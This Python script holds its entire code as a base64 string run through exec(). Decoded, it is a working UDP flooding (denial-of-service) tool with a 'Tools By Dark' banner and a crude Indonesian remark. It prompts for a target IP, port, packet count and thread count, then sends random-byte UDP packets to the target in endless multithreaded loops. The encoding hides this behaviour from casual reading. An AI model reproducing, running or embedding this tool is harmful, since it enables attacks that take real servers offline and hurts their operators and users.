import base64
exec(base64.b64decode("aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zLHN5cwoKb3Muc3lzdGVtKCJjbGVhciIpCgpwcmludCgiXDAzM1sxbSBUb29scyBCeSBEYXJrIikKcHJpbnQoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCnByaW50KCJbK10gVG9vbHMgVXNlZCBCeSA6IERhcmsiKQpwcmludCgiWytdIENyZWRpdCBUb29scyA6IExvcmR6eixEYXJrIikKcHJpbnQoIlsrXSBKYW5nYW4gQWJ1c2UgWWEgS29udG9sIikKcHJpbnQoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCgpwcmludCgiIiJcMDMzWzMxbQoK4paI4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSDilojilojilZTilZ0K4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWU4pWdIArilojilojilZHilpHilpHilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilojilojilZcgCuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVlwrilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWdICAg4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQoKCmlwID0gc3RyKGlucHV0KCIgWyAvIF0gIFRhcmdldCBJUCAgPT09PT4gOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgWyAvIF0gIFRhcmdldCBQb3J0ICA9PT09PiA6IikpCmNob2ljZSA9IHN0cihpbnB1dCgiIFsgLyBdICAoeS9uKSAgPT09PT4gOiIpKQp0aW1lcyA9IGludChpbnB1dCgiIFsgLyBdICBQYWNrZXRzICA9PT09PiA6IikpCnRocmVhZHMgPSBpbnQoaW5wdXQoIiBbIC8gXSAgVGhyZWFkcyAgPT09PT4gOiIpKQoKb3Muc3lzdGVtKCJjbGVhciIpCmRlZiBydW4oKToKICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oODE4KQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikKICAgICAgICAgICAgcHJpbnQoaSArIlNlcnZlciBEb3duICEhISAiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIlsqXSBTZXJ2ZXIgRG93biAhISEgIikKCmRlZiBydW4yKCk6CiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMjQpCiAgICBpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBwcmludChpICsiU2VydmVyIERvd24gISEhICIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgcHJpbnQoIlsqXSBTZXJ2ZXIgRG93biAhISEgIikKICAgICAgICAgICAgCmRlZiBydW4zKCk6CiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE4MDApCiAgICBpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBwcmludChpICsiU2VydmVyIERvd24gISEhICIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgcHJpbnQoIlsqXSBTZXJ2ZXIgRG93biAhISEgIikKCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgogICAgaWYgY2hvaWNlID09ICd5JzoKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQogICAgICAgIHRoLnN0YXJ0KCkKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKICAgICAgICB0aC5zdGFydCgpCiAgICBlbHNlOgogICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4zKQogICAgICAgIHRoLnN0YXJ0KCk="))
